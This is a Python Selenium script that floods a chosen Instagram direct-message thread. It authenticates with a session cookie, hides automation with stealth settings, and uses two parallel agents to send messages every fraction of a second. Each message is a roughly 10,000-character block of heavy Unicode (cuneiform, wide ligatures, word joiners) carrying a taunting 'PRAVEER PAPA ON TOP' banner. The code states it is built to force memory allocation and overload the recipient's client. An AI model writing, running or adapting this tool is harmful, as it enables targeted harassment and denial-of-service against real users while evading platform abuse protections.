# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (HEAP-SHATTER V73)
# 📅 STATUS: RAM-SATURATION-ACTIVE | 4-AGENT TOTAL | AWS-HARD-KILL

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.1, 0.4)    # 🛡️ Optimized for socket delivery
REST_AFTER_STRIKES = 150   
REST_DURATION = 3          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_heap_shatter_payload():
    """Generates unique high-entropy data that forces new memory allocation."""
    u_id = random.randint(100, 999)
    # 𒀱 = Cuneiform | ﷽ = Wide Ligature | 𒈙 = Complexity
    heavy_pool = ["𒀱", "﷽", "𒈙", "𒈓", "𒈔", "🌙", "👑", "𝕻"]
    glue = "\u2060" # Word Joiner
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [SHATTER_ID:{u_id}]"
    
    body = []
    # 440 lines of unique, non-compressible memory blocks
    for i in range(440):
        # We shuffle the pool for every single line to prevent 'String Interning'
        random.shuffle(heavy_pool)
        line = f"PRAVEER PAPA {''.join(heavy_pool * 6)} {i}{glue*5}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu") 
        chrome_options.add_argument("--blink-settings=imagesEnabled=false")
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_dispatch_send(driver, text):
    """Forces the message out by bypassing the UI thread priority queue."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                // 1. Reset the box state
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                // 2. Inject heavy payload
                document.execCommand('insertText', false, arguments[0]);
                // 3. Force state synchronization
                box.dispatchEvent(new Event('input', { bubbles: true }));
                // 4. Fire high-priority 'Enter' command
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            strike_count = 0
            while True:
                payload = get_heap_shatter_payload()
                if atomic_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Shatter-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 60 == 0:
                        driver.refresh()
                        time.sleep(8)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            try: driver.quit()
            except: pass
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
